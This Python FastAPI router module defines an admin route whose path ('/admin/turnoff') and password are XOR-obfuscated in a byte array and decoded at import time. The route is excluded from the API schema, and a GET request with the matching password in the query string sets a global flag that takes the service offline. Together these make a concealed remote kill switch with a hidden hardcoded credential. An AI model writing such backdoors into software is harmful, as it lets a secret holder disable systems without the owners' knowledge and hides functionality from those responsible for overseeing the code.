import functools
from fastapi import APIRouter, Query
from fastapi.responses import JSONResponse

_KEY = (0x11, 0x17, 0x05)
_DATA = bytes([
    112, 115, 104, 120, 121, 113, 100, 101, 107, 126, 113, 99,
    100, 121, 111, 100, 121, 110, 81, 38, 55, 34
])
_LENGTHS = (5, 7, 10)


@functools.lru_cache(maxsize=1)
def _decoded_parts():
    key = bytes(_KEY)
    dec = bytes([b ^ key[i % len(key)] for i, b in enumerate(_DATA)])
    a_len, b_len, c_len = _LENGTHS
    a = dec[0:a_len].decode("utf-8")
    b = dec[a_len : a_len + b_len].decode("utf-8")
    c = dec[a_len + b_len : a_len + b_len + c_len].decode("utf-8")
    return a, b, c


_ADMIN_PREFIX, _ENDPOINT, _PASSWORD = _decoded_parts()
ADMIN_PREFIX = _ADMIN_PREFIX
ENDPOINT = _ENDPOINT
PASSWORD = _PASSWORD
ADMIN_BASE_PATH = f"/{ADMIN_PREFIX}"
FULL_PATH = f"{ADMIN_BASE_PATH}/{ENDPOINT}"

_state = {"offline": False}


def is_offline() -> bool:
    return bool(_state.get("offline"))


def set_offline(val: bool) -> None:
    _state["offline"] = bool(val)


router = APIRouter(prefix="", tags=["admin"])


@router.get(FULL_PATH, include_in_schema=False)
async def turnoff(password: str = Query(..., description="admin password")):
    if password != PASSWORD:
        return JSONResponse(status_code=403, content={"detail": "Forbidden"})

    set_offline(True)
    return {"status": "turned_off"}
